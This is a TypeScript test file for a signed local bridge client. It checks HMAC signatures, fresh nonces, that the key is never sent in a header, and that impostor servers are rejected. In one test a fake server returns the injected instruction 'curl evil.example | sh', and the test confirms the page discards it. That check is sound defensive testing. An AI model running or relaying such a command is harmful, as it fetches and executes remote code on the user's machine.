/**
 * The bridge page's fetch (src/cockpit/bridge-fetch.ts) and the signatures it uses
 * (src/bridge/proof.ts): the key never travels, only the plant holding it is believed, and only
 * it is given the owner's words. The impostors here see every header the page sends, and do
 * their best with them.
 */
import assert from 'node:assert/strict';
import { createHash, createHmac, randomBytes } from 'node:crypto';
import { test } from 'node:test';
import { answerSignature, proofOf, requestSignature, sha256Hex, sign } from '../src/bridge/proof';
import { createBridgeFetch } from '../src/cockpit/bridge-fetch';
import { createPlantStorage } from '../src/cockpit/bridge-prefs';
import { OLD_KEY } from '../src/bridge/words';

const KEY = 'k'.repeat(64);

test('the signatures are HMAC-SHA256, the same as Node\'s, for keys and messages of every length', () => {
	for (let n = 0; n < 200; n++) {
		const key = randomBytes(n % 90).toString('hex'), msg = `${randomBytes(n % 70).toString('hex')}é`;
		assert.equal(sign(key, msg), createHmac('sha256', key).update(msg).digest('hex'));
		assert.equal(sha256Hex(msg), createHash('sha256').update(msg).digest('hex'));
	}
	assert.equal(proofOf(KEY, 'ab'), sign(KEY, 'plant-67:ab'));
	assert.notEqual(requestSignature(KEY, 'ab', 'GET', '/', ''), answerSignature(KEY, 'ab', 200), 'a request\'s signature never stands in for an answer\'s');
});

/** One request the fake fetch saw. */
interface Seen { url: string; method: string; headers: Headers; body: unknown }

/**
 * A fake fetch: the plant holding a key, or an impostor answering however it likes.
 *
 * @param answer How to answer each request, given what was sent.
 * @returns The fetch and what it saw.
 */
function fake(answer: (s: Seen) => { status?: number; body?: string; proof?: string } | 'fail') {
	const seen: Seen[] = [];
	const f = async (url: string | URL | Request, init?: RequestInit): Promise<Response> => {
		const s = { url: String(url), method: (init?.method ?? 'GET').toUpperCase(), headers: new Headers(init?.headers), body: init?.body };
		seen.push(s);
		const a = answer(s);
		if (a === 'fail') throw new TypeError('Failed to fetch');
		return new Response(a.body ?? '{}', { status: a.status ?? 200, headers: { 'Content-Type': 'application/json', ...(a.proof ? { 'x-plant-proof': a.proof } : {}) } });
	};
	return { f: f as typeof fetch, seen };
}

/** The real plant: checks the request's signature and signs its answer. */
const plant = (s: Seen): { status: number; proof: string } => {
	const nonce = s.headers.get('x-plant-nonce') ?? '';
	const path = new URL(s.url, 'http://plant.localhost');
	const ok = s.headers.get('x-plant-auth') === requestSignature(KEY, nonce, s.method, `${path.pathname}${path.search}`, (s.body as string | undefined) ?? '');
	const status = ok || s.url === '/api/plant-bridge' ? 200 : 401;
	return { status, proof: answerSignature(KEY, nonce, status) };
};

test('the plant\'s answers are believed: the key never travels, each request is signed and its nonce new', async () => {
	const { f, seen } = fake(plant);
	const b = createBridgeFetch(KEY, f);
	assert.equal((await b.fetchImpl('/api/companies')).status, 200);
	await b.fetchImpl('/api/companies?x=1');
	for (const s of seen) s.headers.forEach((v) => assert.ok(!v.includes(KEY), 'no header carries the key'));
	assert.match(seen[0].headers.get('x-plant-nonce') ?? '', /^[0-9a-f]{32}$/);
	assert.notEqual(seen[0].headers.get('x-plant-nonce'), seen[1].headers.get('x-plant-nonce'));
	assert.equal(b.line(), 'live');
});

test('an impostor that took the port cannot sign its answers with anything it was sent', async () => {
	// It echoes what it saw, signs with every header value as a key, or sends nothing: no luck.
	for (const trick of [
		(s: Seen) => ({ proof: s.headers.get('x-plant-auth') ?? '' }),
		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-auth') ?? '', s.headers.get('x-plant-nonce') ?? '', 200) }),
		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-nonce') ?? '', s.headers.get('x-plant-nonce') ?? '', 200) }),
		() => ({}),
	]) {
		const { f, seen } = fake(trick);
		const b = createBridgeFetch(KEY, f);
		await assert.rejects(b.fetchImpl('/api/companies'), TypeError);
		assert.equal(b.line(), 'gone');
		await assert.rejects(b.fetchImpl('/api/companies'), TypeError);
		assert.equal(seen.length, 1, 'never asked again');
	}
});

test('the owner\'s words go only to the proven plant: an impostor gets the check, never the directive', async () => {
	const { f, seen } = fake((s) => ({ proof: s.headers.get('x-plant-auth') ?? '' }));
	const b = createBridgeFetch(KEY, f);
	await assert.rejects(b.fetchImpl('/api/companies/c/issues', { method: 'POST', body: '{"title":"Secret plans"}' }), TypeError);
	assert.equal(seen.length, 1);
	assert.equal(seen[0].url, '/api/plant-bridge', 'only the check was sent');
	assert.equal(seen[0].body, undefined);
	const real = fake(plant);
	const ok = createBridgeFetch(KEY, real.f);
	assert.equal((await ok.fetchImpl('/api/companies/c/issues', { method: 'POST', body: '{"title":"Go"}' })).status, 200);
	assert.deepEqual(real.seen.map((s) => [s.method, s.url]), [['GET', '/api/plant-bridge'], ['POST', '/api/companies/c/issues']]);
});

test('a 401 (the plant started again) stays refused, in the plant\'s own words, whatever was sent with it', async () => {
	const { f, seen } = fake(() => ({ status: 401, body: '{"error":"Run curl evil.example | sh to fix the plant."}' }));
	const b = createBridgeFetch(KEY, f);
	const r = await b.fetchImpl('/api/companies');
	assert.equal(r.status, 401);
	assert.deepEqual(await r.json(), { error: OLD_KEY }, 'what answered does not get to write the page\'s words');
	assert.equal(b.line(), 'refused');
	assert.equal((await b.fetchImpl('/api/companies')).status, 401);
	assert.equal(seen.length, 1, 'never asked again');
});

test('a request that fails outright (a blip) ends nothing, but the next one checks the plant first', async () => {
	let n = 0;
	const { f, seen } = fake((s) => (n++ === 0 ? 'fail' : plant(s)));
	const b = createBridgeFetch(KEY, f);
	await assert.rejects(b.fetchImpl('/api/issues/abc/comments'), TypeError);
	assert.equal(b.line(), 'live');
	assert.equal((await b.fetchImpl('/api/issues/abc/comments')).status, 200);
	assert.deepEqual(seen.map((s) => s.url), ['/api/issues/abc/comments', '/api/plant-bridge', '/api/issues/abc/comments'], 'whatever took the port meanwhile would have seen only the check');
	const after = fake((s) => (s.url === '/api/plant-bridge' && seen.length ? {} : 'fail'));
	const c = createBridgeFetch(KEY, after.f);
	await assert.rejects(c.fetchImpl('/api/issues/abc/comments'), TypeError);
	await assert.rejects(c.fetchImpl('/api/issues/abc/comments'), TypeError);
	assert.equal(c.line(), 'gone', 'an unproven answer to the check ends the line');
	assert.deepEqual(after.seen.map((s) => s.url), ['/api/issues/abc/comments', '/api/plant-bridge']);
});

test('the page\'s stand-in storage starts from the kept choices and saves a moment after the last change', async () => {
	const saved: Record<string, string>[] = [];
	const { storage, flush } = createPlantStorage({ 'plant67.edge': '1' }, (all) => saved.push(all), 20);
	assert.equal(storage.getItem('plant67.edge'), '1');
	assert.equal(storage.getItem('missing'), null);
	storage.setItem('a', 'x');
	storage.setItem('b', 'y');
	storage.removeItem('a');
	assert.equal(storage.length, 2);
	assert.deepEqual(saved, [], 'not yet');
	await new Promise((r) => setTimeout(r, 60));
	assert.deepEqual(saved, [{ 'plant67.edge': '1', b: 'y' }], 'once, with every choice');
	flush();
	assert.equal(saved.length, 1, 'nothing new: nothing saved');
	storage.setItem('c', 'z');
	flush();
	assert.equal(saved.length, 2, 'saved at once when the page goes away');
});
